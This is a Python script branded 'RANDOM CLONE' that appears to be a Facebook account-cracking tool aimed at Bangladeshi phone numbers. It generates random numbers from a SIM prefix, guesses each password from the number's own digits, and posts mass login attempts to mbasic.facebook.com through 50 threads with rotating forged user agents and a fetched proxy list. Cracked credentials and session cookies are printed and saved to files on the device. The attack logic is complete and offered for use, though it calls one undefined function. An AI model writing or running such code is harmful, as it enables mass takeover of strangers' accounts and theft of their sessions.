
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
  
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 

logo =("""\033[1;32m 
\033[1;32m   
\033[1;32m   
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [🔰]AUTHOR    \033[1;32m: \033[1;92mSHIHAB               ┃
 ┃ [🔰]TOOL      \033[1;32m: \033[1;92mRANDOM CLONE               ┃
 ┃ [🔰]STATUS    \033[1;32m: \033[1;92mFREE                       ┃
 ┃ [🔰]SYSTEM    \033[1;32m: \033[1;92mDATA ÷ WIFI                ┃
 ┃ [🔰]GITHUB    \033[1;32m: \033[1;92mXR-SHIHAB-999                   ┃
 ┃ [🔰]FACEBOOK  \033[1;32m: \033[1;92mShihab parvej             ┃
 ┃ [🔰]WHATSAPP  \033[1;32m: \033[1;92m+8801960390441             ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; moto g(8) Build/QPJS30.63-35-1-13; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 10; moto g(8) Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/287.0.0.5.120;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
ugen2=["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_9)  AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/13.0.803.0 Safari/538.0.2",
"Mozilla/5.0 (Windows NT 6.2; rv:8.0) Gecko/20100101 Firefox/8.0.7",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7 rv:5.0; SW) AppleWebKit/536.1.2 (KHTML, like Gecko) Version/7.0.2 Safari/536.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/33.0.852.0 Safari/533.2.0",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:11.6) Gecko/20100101 Firefox/11.6.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/22.0.833.0 Safari/536.1.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6 rv:3.0; YI) AppleWebKit/536.1.2 (KHTML, like Gecko) Version/6.0.9 Safari/536.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/35.0.800.0 Safari/537.0.2",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Trident/5.0; .NET CLR 2.5.65343.9)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/29.0.877.0 Safari/532.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/38.0.868.0 Safari/533.1.1",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0; .NET CLR 4.4.41414.7)",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/21.0.822.0 Safari/537.2.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/21.0.876.0 Safari/535.0.0",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET CLR 4.2.78115.3)",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/28.0.805.0 Safari/535.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/39.0.854.0 Safari/538.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/21.0.834.0 Safari/536.1.2",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/7.1; .NET CLR 3.7.45470.6)",
"Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:9.9) Gecko/20100101 Firefox/9.9.8",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/35.0.876.0 Safari/534.2.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/33.0.885.0 Safari/535.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/35.0.857.0 Safari/534.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/34.0.813.0 Safari/537.2.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/21.0.830.0 Safari/536.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/27.0.832.0 Safari/535.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/20.0.849.0 Safari/538.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/18.0.816.0 Safari/537.0.2",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:6.5) Gecko/20100101 Firefox/6.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/13.0.857.0 Safari/537.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/26.0.874.0 Safari/533.2.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/16.0.817.0 Safari/533.0.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2)  AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/20.0.855.0 Safari/538.1.1",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; .NET CLR 2.6.42181.6)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/21.0.871.0 Safari/535.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/31.0.802.0 Safari/534.1.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.6; rv:13.8) Gecko/20100101 Firefox/13.8.7",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/27.0.803.0 Safari/538.0.1",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/5.0; .NET CLR 1.7.62399.1)",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/32.0.800.0 Safari/534.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/17.0.883.0 Safari/531.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/18.0.830.0 Safari/533.1.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1 rv:4.0; JV) AppleWebKit/531.0.2 (KHTML, like Gecko) Version/4.1.10 Safari/531.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/13.0.865.0 Safari/532.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/37.0.806.0 Safari/533.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/32.0.820.0 Safari/533.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/25.0.875.0 Safari/532.0.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.1; rv:7.5) Gecko/20100101 Firefox/7.5.6",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/7.1; .NET CLR 2.0.29090.2)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_6 rv:2.0; BO) AppleWebKit/533.0.0 (KHTML, like Gecko) Version/5.0.8 Safari/533.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/19.0.814.0 Safari/534.1.0Opera/9.67 (Windows NT 5.2; U; LB Presto/2.9.160 Version/12.00)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/25.0.859.0 Safari/534.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/31.0.881.0 Safari/535.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/22.0.856.0 Safari/533.2.0",
"Mozilla/5.0 (Windows NT 5.0; WOW64; rv:5.7) Gecko/20100101 Firefox/5.7.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/34.0.883.0 Safari/532.0.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:12.8) Gecko/20100101 Firefox/12.8.2Opera/11.34 (Windows NT 5.1; U; MK Presto/2.9.186 Version/11.00)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/17.0.802.0 Safari/532.1.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4)  AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/14.0.824.0 Safari/532.1.2",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/7.0; .NET CLR 1.1.96088.1)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/3.1; .NET CLR 3.2.98567.3)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9)  AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/28.0.800.0 Safari/535.0.2",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.1; .NET CLR 2.7.92705.2)Opera/12.10 (Windows NT 5.0; U; LV Presto/2.9.188 Version/12.00)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5 rv:2.0; HR) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/5.1.7 Safari/531.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/17.0.889.0 Safari/531.0.0",
"Mozilla/5.0 (Windows NT 5.1; WOW64; rv:12.5) Gecko/20100101 Firefox/12.5.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/39.0.838.0 Safari/538.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/20.0.834.0 Safari/536.1.1",
"Mozilla/5.0 (Windows NT 6.1; rv:13.1) Gecko/20100101 Firefox/13.1.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/14.0.896.0 Safari/532.1.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_9 rv:6.0; FY) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/6.0.0 Safari/531.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/17.0.890.0 Safari/537.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/35.0.864.0 Safari/531.2.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/17.0.879.0 Safari/538.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/31.0.877.0 Safari/537.0.2",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/6.0; .NET CLR 4.3.91067.6)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5 rv:4.0; CY) AppleWebKit/536.0.0 (KHTML, like Gecko) Version/4.0.10 Safari/536.0.0",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/5.1; .NET CLR 1.0.12335.6)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/3.0; .NET CLR 3.2.52823.7)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/24.0.848.0 Safari/537.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/20.0.892.0 Safari/535.2.1",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/4.1; .NET CLR 2.0.36704.7)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/14.0.851.0 Safari/537.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/16.0.880.0 Safari/533.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/30.0.864.0 Safari/538.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/31.0.885.0 Safari/538.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/36.0.856.0 Safari/532.0.0Opera/13.85 (Windows NT 5.0; U; SK Presto/2.9.171 Version/11.00)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; .NET CLR 2.0.84614.8)",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/30.0.895.0 Safari/537.2.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/33.0.835.0 Safari/532.1.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_7)  AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/18.0.845.0 Safari/535.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/28.0.867.0 Safari/537.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/25.0.865.0 Safari/532.0.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9.4; rv:5.3) Gecko/20100101 Firefox/5.3.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/37.0.842.0 Safari/536.1.2",
"Mozilla/5.0 (Windows NT 5.2; WOW64; rv:14.4) Gecko/20100101 Firefox/14.4.9",]
        
        
def uf():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🇧🇩 EXAMPLE : 017, 018, 019, 016, 9196, 9178┃ ')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    mr1 = '0171'
    mr2 = '0172'
    mr3 = '0171'
    mr4 = '0171'
    code = random.choice([mr1,mr2,mr3,mr4]) 
    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🇧🇩]EXAMPLE : 3000, 5000, 10000, 50000┃')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        clear()
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(" [🔰]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)                  
        print('\033[1;37m [🔰] SIM CODE : \033[38;5;46m'+code)           
        print(f' \033[97;1m[🔰]TOTAL IDS: '+tl)
        print(' \033[1;97m[🔰] Crack has been started      ')
        print(' \033[1;97m[🔰] Wait for ok ids             ')
        print(' \033[1;97m[🔰] Use flight mode for speed up ')
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            morshed.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write('\r\33[1;92mSHIHAB][%s/%s][OK-%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[CP] ' +uad+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;92mSHIHAB][%s/%s][OK-%s]\r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
 
uf()
 
